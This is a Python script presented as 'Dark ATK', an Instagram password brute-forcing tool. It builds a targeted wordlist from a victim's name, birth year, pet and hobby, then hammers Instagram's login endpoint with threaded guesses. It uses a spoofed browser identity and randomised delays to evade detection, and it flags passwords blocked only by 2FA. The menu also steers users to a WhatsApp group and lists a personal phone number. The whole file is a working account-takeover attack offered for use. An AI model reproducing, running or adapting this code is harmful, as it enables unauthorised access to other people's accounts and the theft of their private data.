import requests
import time
import random
import re
import itertools
import threading
from queue import Queue
import webbrowser
import sys 

# Tool Banner
print("""
--------------------------------------------------
       Tool Name: Dark ATK
       Author: Amit
       By: DARK
--------------------------------------------------
""")

# Menu Function
def show_menu():
    print("\nTool successfully installed! Choose an option:")
    print("1. Start (Join WhatsApp group to proceed)")
    print("2. Contact Owner (DM via WhatsApp)")
    print("3. Exit (Leave with style)")
    choice = input("\nEnter your choice (1-3): ").strip()
    return choice

# WhatsApp Group and Contact Links
whatsapp_group_link = "https://chat.whatsapp.com/LYMt9FKfYSuDcTH5W3C2r5"
owner_number = "+919836942455"
contact_message = "Hello Amit, I’m using Dark ATK. Can you assist me?"

# Instagram login URL
login_url = "https://www.instagram.com/accounts/login/ajax/"

# Headers to mimic a browser
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "X-Requested-With": "XMLHttpRequest",
    "Referer": "https://www.instagram.com/accounts/login/",
    "Content-Type": "application/x-www-form-urlencoded",
}

def get_csrf_token(session):
    """Fetch CSRF token from Instagram"""
    response = session.get("https://www.instagram.com/", headers=headers)
    csrf_token = response.cookies.get("csrftoken")
    if not csrf_token:
        raise Exception("Failed to get CSRF token")
    return csrf_token

def extract_username(profile_url):
    """Extract username from Instagram profile URL"""
    pattern = r"instagram.com/([a-zA-Z0-9_.]+)"
    match = re.search(pattern, profile_url)
    if match:
        return match.group(1)
    else:
        raise ValueError("Invalid Instagram profile URL")

def generate_million_wordlist():
    """Generate 1M+ passwords based on user input and combinations"""
    print("\nAnswer the following questions to seed the wordlist (leave blank if unknown):")
    name = input("Target's name or nickname (e.g., John): ").strip().lower()
    birth_year = input("Target's birth year (e.g., 1995): ").strip()
    favorite_number = input("Target's favorite number (e.g., 7): ").strip()
    pet_name = input("Target's pet name (e.g., Max): ").strip().lower()
    hobby = input("Target's hobby or interest (e.g., soccer): ").strip().lower()

    base_words = [name, birth_year, favorite_number, pet_name, hobby]
    base_words = [w for w in base_words if w]  # Remove empty strings
    if not base_words:
        base_words = ["test"]
    suffixes = ["", "123", "!", "@", "2023", "2024", "pass"]
    numbers = [str(i) for i in range(10)]

    def password_generator():
        for word in base_words:
            for suffix in suffixes:
                yield f"{word}{suffix}"
                yield f"{word.capitalize()}{suffix}"
        for w1, w2 in itertools.product(base_words, base_words):
            if w1 != w2:
                for num in numbers:
                    yield f"{w1}{w2}{num}"
                    yield f"{w1.capitalize()}{w2}{num}"
        for w1, w2, num in itertools.product(base_words, base_words, numbers):
            if w1 != w2:
                yield f"{w1}{w2}{num}"
                yield f"{w1.capitalize()}{w2}{num}"
        chars = "abcdefghijklmnopqrstuvwxyz0123456789!@#"
        for base in base_words:
            for _ in range(10000):
                rand_suffix = ''.join(random.choice(chars) for _ in range(6))
                yield f"{base}{rand_suffix}"

    return password_generator()

def brute_force_worker(username, password_queue, delay, result):
    """Worker thread to process passwords"""
    session = requests.Session()
    csrf_token = get_csrf_token(session)
    headers["x-csrftoken"] = csrf_token

    while not password_queue.empty() and not result["found"]:
        password = password_queue.get()
        try:
            payload = {
                "username": username,
                "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}",
                "queryParams": "{}",
                "optIntoOneTap": "false",
            }

            response = session.post(login_url, data=payload, headers=headers)
            data = response.json()
            if data.get("authenticated"):
                print(f"\nSuccess! Password found: {password}")
                result["found"] = True
                result["password"] = password
                break
            elif "checkpoint_required" in data:
                print(f"\nPassword {password} triggered verification.")
                break
            elif "two_factor_required" in data:
                print(f"\nPassword {password} is correct but 2FA enabled.")
                break
            else:
                with threading.Lock():
                    print(f"Tried: {password} - Failed")

            time.sleep(random.uniform(delay, delay + 0.5))

        except Exception as e:
            print(f"Error: {e}")
            time.sleep(2)
        finally:
            password_queue.task_done()

def instagram_brute_force_million(profile_url, delay=0.5, max_attempts=1000000, threads=2):
    """Brute force with 1M+ wordlist and threading"""
    username = extract_username(profile_url)
    print(f"\nTarget username: {username}")

    password_gen = generate_million_wordlist()
    password_queue = Queue()
    total_generated = 0

    for password in password_gen:
        if total_generated >= max_attempts:
            break
        password_queue.put(password)
        total_generated += 1

    print(f"Generated {total_generated} passwords for the attack.")

    result = {"found": False, "password": None}

    print(f"Starting brute force with {threads} threads...")
    thread_list = []
    for _ in range(min(threads, total_generated)):
        t = threading.Thread(target=brute_force_worker, args=(username, password_queue, delay, result))
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    if result["found"]:
        print(f"\nAttack successful! Password: {result['password']}")
    else:
        print(f"\nAttack complete. No password found after {total_generated} attempts.")

# Main Logic with Menu
if __name__ == "__main__":
    choice = show_menu()

    if choice == "1":
        print(f"\nPlease join our WhatsApp group to proceed: {whatsapp_group_link}")
        webbrowser.open(whatsapp_group_link)
        input("Press Enter after joining the group to start the tool...")
        profile_url = input("\nEnter the Instagram profile URL (e.g., https://www.instagram.com/username/): ")
        delay = float(input("Enter delay between attempts in seconds (e.g., 0.5): "))
        max_attempts = int(input("Enter max number of attempts (e.g., 1000000): "))
        threads = int(input("Enter number of threads (e.g., 2): "))
        instagram_brute_force_million(profile_url, delay, max_attempts, threads)

    elif choice == "2":
        whatsapp_contact_link = f"https://wa.me/{owner_number}?text={contact_message.replace(' ', '%20')}"
        print("\nOpening WhatsApp to contact the owner...")
        webbrowser.open(whatsapp_contact_link)
        print("Message opened. Send your query to Amit!")

    elif choice == "3":
        print("""
        
Hasta la vista, baby!   
   Dark ATK signing off in style.   
   Catch you in the shadows! 😎
        
        """)

    else:
        print("\nInvalid choice. Run the tool again and select 1, 2, or 3.")